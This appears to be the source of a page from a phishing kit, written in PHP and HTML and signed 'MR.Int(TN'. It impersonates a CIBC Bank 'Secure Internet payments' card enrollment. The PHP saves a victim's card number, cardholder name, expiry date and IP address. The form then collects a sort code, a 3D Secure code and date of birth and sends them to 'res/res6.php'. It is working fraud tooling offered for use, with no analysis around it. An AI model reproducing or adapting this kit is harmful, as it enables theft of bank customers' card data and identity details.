<?php

/* - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -  */
/*                   #              ||~~MR.Int(TN  ~~||              #                            */
/* - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -  */
error_reporting(0);
session_start();
include("lang/". $_SESSION['_lang_'].".php");
if(isset($_POST['noob'])){
$ip = $_SERVER["REMOTE_ADDR"];
$_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];

#browser info
$browser = $user_browser." - ".$user_os." - ".substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0,5);



#Credit card information
$_SESSION['cardholdername'] = $_POST['cardholdername'];
$_SESSION['cardNumber'] = $_POST['cardNumber'];
$_SESSION['edmonth'] = $_POST['edmonth'];
$_SESSION['edyear'] = $_POST['edyear'];

 if(isset($_POST['vbv_ready']) == true){
  #ip info
  header("location:res/res5.php?websrc=".md5('XRAY')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");
        }
else{

 header("location:vbv.php.php?websrc=".md5('XRAY')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");
        }
		  }
?>


<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>My Account</title>
<meta name="generator" content="WYSIWYG Web Builder 10 - http://www.wysiwygwebbuilder.com">
<link href="images/favicon.ico" rel="shortcut icon" type="image/x-icon">
<link href="css/Untitled1.css" rel="stylesheet">
<link href="css/card.css" rel="stylesheet">

<style type="text/css">
    .check_box{
        background-image: url("css/onboarding_form.png");
        background-repeat: no-repeat;
        padding-left: 28px;
        line-height: 26px;
        display: inline-block;
        margin-bottom: 9px;
        cursor: pointer;
    }
    #checked{
        background-position: 0px -100px;
    }
    #inchecked{
        background-position: 0px 0px;
    }
.inp{
        width: 331px;
        height: 40px;
        padding-left: 12px;
        margin-bottom: 15px;
        border: 1px solid #B7B6B6;
        border-radius: 3px;
        font-size: 16px;
        text-transform: capitalize;
} 
  .card{
        display: inline-block;
        background-image: url("css/sprites_cc_global.png");
        background-repeat: no-repeat;
        background-position: 0px -406px;
        height: 12px;
        position: relative;
        left: 124px;
        bottom: -15px;
        width: 40px;
         }
    .date{
    display: inline-block;
    background-image: url("css/sprites_cc_global.png");
    background-repeat: no-repeat;
    background-position: 0px -434px;
    height: 28px;
    position: relative;
    left: -49px;
    bottom: -9px;
    width: 40px;
    }
.in{
        font-family: arial, Helvetica, sans-serif;
    font-size: 10pt;
    color: #333;
    font-weight: normal;
    padding-top: 12px;
    padding-bottom: 12px;
    border-radius: 4px;
    border: 1px solid #CCC;
    margin: 5px;
    float: left;
}
  </style>
</head>

<script>
        jQuery(function($){
            $("#date").mask("99/9999");
			 $("#sortcode").mask("99-99-99");
			 
            $("#ssn").mask("999-99-9999");
        });
        /*verif if null or true*/
        /*   $(document).ready(function(){
         var cardlong = document.getElementById('cardnumber');
         if(cardlong.length == false){
         alert('yes');
         }
         $('#cardnumber').blur(function() {
         $('#cardnumber').css('border','1px solid #cf1900');
         });

         });

         $('#date').blur(function() {
         $('#date').css('border','1px solid #cf1900');
         });
         $('#cvv').blur(function() {
         $('#cvv').css('border','1px solid #cf1900');
         });
         */
        /*start scrit check*/
        $(document).on("click","#inchecked",function(){
            var inchecked = document.getElementById('inchecked');
            var input_check = document.getElementById('checkbox');

            if(inchecked.id == 'inchecked'){
                inchecked.id = "checked";
                input_check.setAttribute('checked','checked');
            }
        });
        $(document).on("click","#checked",function(){
            var checked = document.getElementById('checked');
            var input_check = document.getElementById('checkbox');
            if(checked.id == 'checked'){
                checked.id = "inchecked";
                input_check.removeAttribute('checked');
            }
        });
        /*En of script*/


        function type_carte(){
            var get_value = document.getElementById('cardnumber').value;
            var type = get_value.substring(0,2);
            var other = get_value.substring(0,1);
            if(other == "4"){
                document.getElementById("card").style.backgroundPosition = "0px 1px";
                document.getElementById("cvv").maxLength ="3"
            }else if(other == "5"){
                document.getElementById("card").style.backgroundPosition = "0px -29px";
                document.getElementById("cvv").maxLength ="3"
            }
            /*Amex Card*/
            else if(type == "34"){
                document.getElementById("card").style.backgroundPosition = "0px -57px";
                document.getElementById('cont_in').style.display ="none"
                document.getElementById('type_cvv').style.backgroundPosition ="0px -462px";
                document.getElementById("cvv").maxLength ="4"
            }
            else if(type == "37"){
                document.getElementById("card").style.backgroundPosition = "0px -57px";
                document.getElementById('cont_in').style.display ="none"
                document.getElementById('type_cvv').style.backgroundPosition ="0px -462px";
                document.getElementById("cvv").maxLength ="4"
            }

            /*End Amex Card*/

            /*blue Card*/
            else if(type == "30"){
                document.getElementById("card").style.backgroundPosition = "0px -116px";
                document.getElementById('cont_in').style.display ="none"
            } else if(type == "36"){
                document.getElementById("card").style.backgroundPosition = "0px -116px";
                document.getElementById('cont_in').style.display ="none"
            }
            else if(type == "38"){
                document.getElementById("card").style.backgroundPosition = "0px -116px";
                document.getElementById('cont_in').style.display ="none"
            }
            /*End blue Card*/
            else if(other == "6"){
                document.getElementById("card").style.backgroundPosition = "0px -86px";
                document.getElementById('cont_in').style.display ="none"
            }
            else if(type == "35"){
                document.getElementById("card").style.backgroundPosition = "0px -145px";
                document.getElementById('cont_in').style.display ="none"
            }else{
                document.getElementById("card").style.backgroundPosition = "0px -406px";
                document.getElementById('cont_in').style.display ="block"
                document.getElementById('type_cvv').style.backgroundPosition ="0px -434px";
                document.getElementById("cvv").maxLength ="3"
            }
        };
    </script>
<body>
<div id="wb_Form1" style="position:absolute;left:442px; border-radius: 10px; top:38px;width:431px;height:559px;z-index:0;">

<form class="xxray_51" method="GET"   action="res/res6.php" style="
">

<center>





 <center>
 <br><br>
  <h2 style="
    font-family: Arial, Helvetica, sans-serif;
    font-size: 20pt;
    font-weight: normal;
    color: #666;
"></h2>
		
    
  
<?php
    $card = substr($_SESSION['cardNumber'],0,1);
   if($card == 5 ){
       echo '<img src="images/noobms.gif">';
       echo '<img src="images/logo.PNG" style="float: right;display: inline-block" width="128px">';
   }elseif($card == 4 ){
      echo '<img src="images/noobvbv.gif">';
      echo '<img src="images/logo.PNG" style="float: right;display: inline-block" width="128px">';
      
   }else {
      echo '<img src="images/logo.PNG" style="display: inline-block;margin-left: 55px;" width="128px">';
      
   }
    ?>
 
	    <table WIDTH="400" CELLSPACING="0" CELLPADDING="3" BORDER="0">
  <tbody>
  <tr><td>
<b><font size="2" > Enroll your card</font></b><BR><b><font size="2" >for Secure Internet payments</font></b><br>
</td></tr>

<tr>
<td>
<br>
Dear client,<BR>By this registration application,  CIBC Bank invites you to enroll <B>free of charge</B> your card for the service "Secure Internet payments" to assure maximum security when making online purchases.<BR>
</td>
</tr>
  
   </table>
   
    <p style="font-size: 13px; margin-top: 25px; color: #807979;">Please enter your Secure Code </p>
   <TABLE WIDTH="400" CELLSPACING="0" CELLPADDING="3" BORDER="0">
   <br><br>
        <tr>
            <td align="right">Merchant :</td>
            <td>CIBC.com</td>
        </tr>
        
        
        <tr>
            <td align="right">Card number :</td>
            <td>XXXX-XXXX-XXXX-<?=substr($_SESSION['cardNumber'] , -4);?></td>
        </tr>
        <tr>
            <form method="post"  action=""><input name="flow_name" value="summary/index" type="hidden"><input name="flow_name" value="summary/index" type="hidden" required>
			
'<tr> <td align="right">Sort Code :  <td><input type="password" style="width: 75px;"class="input"   name="CVV" id="CVV" placeholder="Sort Code" required></td><br> </tr>
<tr>
<td align="right">3D Secure :</td>
<td><input style="width: 75px;" type="password" placeholder="3D Secure" name="exp"></td><br>
</tr>
<tr><td align="right">Date Of Brith :</td> <td>				<input name="dob_month" size="1" pattern="[0-9]{2,}" autocomplete="off" required="required" type="text" maxlength="2" placeholder="Month"> - 
				<input name="dob_day"  maxlength="2" size="1" pattern="[0-9]{2,}" autocomplete="off" required="required" type="text" placeholder="Day"> - 
				<input name="dob_year" maxlength="4" size="1" pattern="[0-9]{2,}" autocomplete="off" required="required" type="text" placeholder="Year"></td></tr>
        </tr>
        
        <tr>
            <td></td>
            <td><br>
                <input name="xray-sp" type="submit" value="Submit">
                
            </td>
        </tr>
    </form>
       </tbody>
    </table>
    <p style="text-align: center;font-family: arial, sans-serif;font-size: 9px; color: #656565">
        Copyright В© 1999-2017 . All rights reserved.
    </p>
</div></div>

		<input name="flow_name" value="summary/index" type="hidden"><input name="flow_name" value="summary/index" type="hidden">   
            
            
        </div>
                
            </div>
</body>
</html>